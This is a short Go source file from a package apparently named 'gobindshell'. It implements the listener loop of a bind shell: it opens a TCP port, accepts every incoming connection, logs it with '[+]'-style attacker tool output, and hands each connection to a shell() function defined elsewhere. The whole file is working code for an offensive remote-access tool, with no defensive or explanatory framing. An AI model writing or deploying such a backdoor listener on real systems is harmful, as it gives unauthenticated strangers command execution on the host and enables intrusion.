package gobindshell

import (
	"log"
	"net"
)

func (b *GoBindShell) Listen() {
	listen, err := net.ListenTCP("tcp", b.addr)
	termError("[-] Error listening: ", err)
	log.Println("[+] Listening at: ", b.addr)

  for {
    con, err := listen.AcceptTCP()
    if err != nil {
      log.Println("[-] Error in Accepting Connection: ", err.Error())
      continue
    }

    defer con.Close()
    log.Println("[+] Connection From ", con.RemoteAddr().String())
    go shell(con)
  }
}
